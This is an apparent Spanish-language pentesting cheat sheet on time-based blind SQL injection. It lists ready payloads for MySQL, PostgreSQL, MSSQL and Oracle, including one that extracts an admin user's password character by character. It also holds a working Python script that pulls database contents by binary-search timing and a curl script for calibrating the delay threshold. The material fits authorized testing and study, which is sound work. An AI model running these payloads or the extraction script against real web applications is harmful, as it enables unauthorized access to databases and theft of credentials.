---
aliases:
  - Time-based Blind SQLi
tags:
  - type/technique
  - vuln/sqli
  - technique/execution
  - asset/database
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[SQL Injection (SQLi)]]'
---
# SQLi - Time based

***

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `' AND SLEEP(5)-- -` | Si response tarda 5s → SQLi confirmado | Probe canónico MySQL. |
| `' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=115,SLEEP(5),0)-- -` | Si char[1]=ASCII 115 ('s'), respuesta tarda 5s | Char-by-char extract MySQL. |
| `' AND IF((SELECT 1 FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a'),SLEEP(5),0)-- -` | Extract password char-by-char con foco en admin | Targeted extraction. |
| `' AND IF(1=1,BENCHMARK(5000000,MD5('a')),0)-- -` | CPU-heavy delay alternativo a `SLEEP` | `SLEEP` filtrado/deshabilitado. |
| `' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -` | PostgreSQL delay condicional | Backend PostgreSQL. |
| `'; IF (ASCII(SUBSTRING((SELECT @@version),1,1))=115) WAITFOR DELAY '0:0:5'-- -` | MSSQL delay condicional | Backend MSSQL. Requiere stacked queries. |
| `' AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM dual)-- -` | Oracle delay sin `dbms_lock.sleep` (DBA priv) | Backend Oracle, user sin DBA. |
| `' AND IF((SELECT COUNT(*) FROM information_schema.tables)>20,SLEEP(3),0)-- -` | Confirma cardinalidad por delay | Recon de schema. |
| `' OR SLEEP(5)-- -` | Forzar delay incondicional con `OR` | Test rápido si app es vulnerable a esta sintaxis. |
^sqli-time

### Script búsqueda binaria con timing

```python
#!/usr/bin/env python3
import requests
import time

URL = "https://target/items?id=1"
COOKIES = {"PHPSESSID": "abc"}
SLEEP_THRESHOLD = 4.5  # segundos — adaptar según latencia base

def is_true(payload):
    """Mide latencia. Devuelve True si SQLi disparó el SLEEP."""
    start = time.time()
    requests.get(URL + payload, cookies=COOKIES, timeout=10)
    return (time.time() - start) >= SLEEP_THRESHOLD

def extract_char(position, query):
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        payload = f"' AND IF(ASCII(SUBSTRING(({query}),{position},1))>{mid},SLEEP(5),0)-- -"
        if is_true(payload):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low)

# Extraer nombre de DB actual
query = "SELECT database()"
result = ""
for i in range(1, 30):
    char = extract_char(i, query)
    if char == "\x20" or ord(char) < 32:
        break
    result += char
    print(f"[{i}] {result}")
```

### Calibración del threshold

```bash
TARGET="https://target/items?id=1"

# Baseline (5 mediciones sin SLEEP)
for i in 1 2 3 4 5; do
  T=$(curl -s -o /dev/null -w '%{time_total}' "$TARGET")
  echo "Baseline $i: ${T}s"
done

# Con SLEEP(3)
P="' AND SLEEP(3)-- -"
ENC=$(python3 -c "import urllib.parse;print(urllib.parse.quote('$P'))")
T=$(curl -s -o /dev/null -w '%{time_total}' "$TARGET$ENC")
echo "SLEEP(3): ${T}s"

# Threshold = baseline_p99 + SLEEP * 0.8 (margen para fluctuación de red)
```

___

## Overview

**Time-based blind SQLi** = sin output, sin errores, sin diferencias en respuesta → forzar delays condicionales en el SGBD y medir latencia HTTP.

**Pre-requisitos:**
- Backend ejecuta queries síncronamente — async/batch backends pueden no propagar el delay.
- Latencia de red estable — alta jitter da falsos positivos.

**Vector más lento de todos** — cada char requiere ~7 reqs binarios × delay. Extraer 32 chars = ~224 segundos mínimo. Usar threading para paralelizar requests independientes.

**Por motor:**
- **MySQL**: `SLEEP(n)`, `BENCHMARK(n, expr)` (CPU-heavy).
- **PostgreSQL**: `pg_sleep(n)`, embedded en `CASE WHEN`.
- **MSSQL**: `WAITFOR DELAY '0:0:n'` (requiere stacked queries).
- **Oracle**: `DBMS_PIPE.RECEIVE_MESSAGE('a', n)` sin DBA priv; `dbms_lock.sleep(n)` con DBA.

***
